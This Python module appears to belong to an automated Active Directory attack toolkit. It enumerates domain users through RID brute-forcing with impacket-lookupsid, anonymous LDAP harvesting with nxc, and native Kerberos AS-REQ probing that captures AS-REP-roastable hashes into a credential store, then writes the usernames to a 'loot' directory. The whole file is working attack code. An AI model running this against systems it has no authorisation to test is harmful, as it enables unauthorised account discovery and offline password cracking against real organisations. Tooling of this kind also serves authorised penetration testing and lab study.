from __future__ import annotations

import asyncio
from pathlib import Path

from .. import runner, ui
from ..parsers import parse_lookupsid
from ..state import Findings, loot_dir
from ..wordlists import COMMON_AD_USERS, merge_userlists
from . import kerbrute


async def rid_brute_extended(findings: Findings, max_rid: int = 20000) -> None:
    if not runner.has("lookupsid") or 445 not in findings.target.open_ports:
        return
    ui.explain(
        f"extended RID brute (1 -> {max_rid}). On legacy DCs even authenticated "
        "RID enumeration yields large user/computer dumps."
    )
    cmd = [
        runner.resolve("lookupsid") or "impacket-lookupsid",
        f"@{findings.target.ip}", str(max_rid),
    ]
    ui.cmd(cmd)
    result = await runner.run(cmd, timeout=240)
    entries = parse_lookupsid(result.stdout)
    if not entries:
        return
    users_added = 0
    computers_added = 0
    for rid, info in entries.items():
        findings.sids[info["name"]] = f"rid={rid}"
        if info["type"].lower().startswith("user"):
            if info["name"].endswith("$"):
                findings.add_computer(info["name"].rstrip("$"))
                computers_added += 1
            else:
                if info["name"] not in findings.users:
                    users_added += 1
                findings.add_user(info["name"])
        elif info["type"].lower().startswith("group"):
            findings.add_group(info["name"])
    if users_added:
        ui.good(f"RID brute (extended) added {users_added} new user(s)")
    if computers_added:
        ui.good(f"RID brute (extended) added {computers_added} new computer(s)")


async def kerbrute_native(findings: Findings, candidates: list[str]) -> None:
    if 88 not in findings.target.open_ports:
        ui.explain("Kerberos (88) not open - skipping AS-REQ user probe.")
        return
    if not findings.target.domain:
        return
    if not candidates:
        return
    ui.explain(
        f"sending bare AS-REQs (no preauth) for {len(candidates)} candidates. "
        "KDC response codes: 25=exists, 6=not exist, AS-REP=AS-REP-roastable. "
        "Native Python (no kerbrute binary needed)."
    )
    kdc = findings.target.fqdn or findings.target.ip
    pool_size = runner.opsec_int("kerb_pool", 20)
    results = await kerbrute.probe_many(
        candidates, findings.target.domain, kdc,
        concurrency=pool_size, timeout=3.0,
    )
    confirmed = 0
    asrep = 0
    disabled = 0
    skewed = 0
    for name, (status, hash_value) in results.items():
        if status == "USER_EXISTS_PREAUTH":
            findings.add_user(name)
            confirmed += 1
        elif status == "USER_EXISTS_NOPREAUTH":
            findings.add_user(name)
            findings.notes.append(f"AS-REP roastable: {name}")
            asrep += 1
            ui.crit(f"AS-REP roastable: {name}")
            if hash_value and hash_value not in findings.asrep_hashes:
                from .. import creds_store
                creds_store.add_asrep_hash(findings, name, hash_value)
                ui.good(f"   captured AS-REP hash for {name}")
        elif status == "USER_DISABLED":
            findings.add_user(name)
            findings.notes.append(f"disabled: {name}")
            disabled += 1
        elif status == "SKEW":
            skewed += 1
    if skewed:
        ui.warn(
            f"{skewed} probes hit clock skew (>5min). "
            f"Run: sudo rdate -n {findings.target.ip} (or ntpdate)"
        )
    if confirmed or asrep or disabled:
        ui.good(
            f"AS-REQ probe: {confirmed} confirmed + {asrep} AS-REP-roastable "
            f"+ {disabled} disabled (out of {len(candidates)})"
        )
    else:
        ui.explain("AS-REQ probe found no users. Wordlist may not match this domain.")


async def nxc_users_anon(findings: Findings) -> None:
    if not runner.has("nxc"):
        return
    if not findings.target.domain:
        return
    ui.explain(
        "nxc ldap with empty creds tries an anonymous LDAP read of all users. "
        "Many domains permit anon access to the user objects."
    )
    cmd = [
        runner.resolve("nxc") or "nxc", "ldap", findings.target.ip,
        "-u", "", "-p", "", "--users",
    ]
    ui.cmd(cmd)
    result = await runner.run(cmd, timeout=60)
    if "STATUS_LOGON_FAILURE" in result.combined or "operationsError" in result.combined:
        ui.explain("anonymous LDAP user listing denied.")
        return
    found = 0
    for line in result.stdout.splitlines():
        if "[+]" in line and "Username:" not in line:
            continue
        for token in line.split():
            if token.endswith("$") or "@" in token or "\\" in token:
                continue
            if token.isalnum() and 3 <= len(token) <= 32 and not token.startswith("["):
                pass
        if "[*]" in line and " - " in line and "samaccountname" not in line.lower():
            continue
    for raw in result.stdout.splitlines():
        if raw.startswith("LDAP") and "[+]" not in raw and "Username" not in raw:
            parts = raw.split()
            if len(parts) >= 5:
                candidate = parts[4]
                if candidate and not candidate.endswith("$") and "\\" not in candidate:
                    findings.add_user(candidate)
                    found += 1
    if found:
        ui.good(f"nxc ldap anon harvested {found} user(s)")


async def write_users_artifact(findings: Findings) -> Path | None:
    if not findings.users:
        return None
    out_dir = loot_dir(findings.target.ip)
    path = out_dir / "users.txt"
    path.write_text("\n".join(sorted(findings.users)) + "\n")
    ui.good(f"saved {len(findings.users)} usernames -> {path}")
    return path


async def run_userenum(
    findings: Findings, *,
    extended_rid_max: int = 20000,
    wordlist: Path | None = None,
) -> Path | None:
    ui.section("user enumeration")

    extra: list[str] = []
    if wordlist and wordlist.exists():
        extra = [
            line.strip() for line in wordlist.read_text(errors="replace").splitlines()
            if line.strip() and not line.strip().startswith("#")
        ]
        ui.info(f"loaded {len(extra)} candidates from external wordlist {wordlist}")

    candidates = merge_userlists(findings.users, extra, COMMON_AD_USERS)
    await asyncio.gather(
        rid_brute_extended(findings, extended_rid_max),
        nxc_users_anon(findings),
        kerbrute_native(findings, candidates),
    )
    written = await write_users_artifact(findings)

    from .. import oneliner
    oneliner.emit_for_userlist(findings, len(findings.users))
    return written
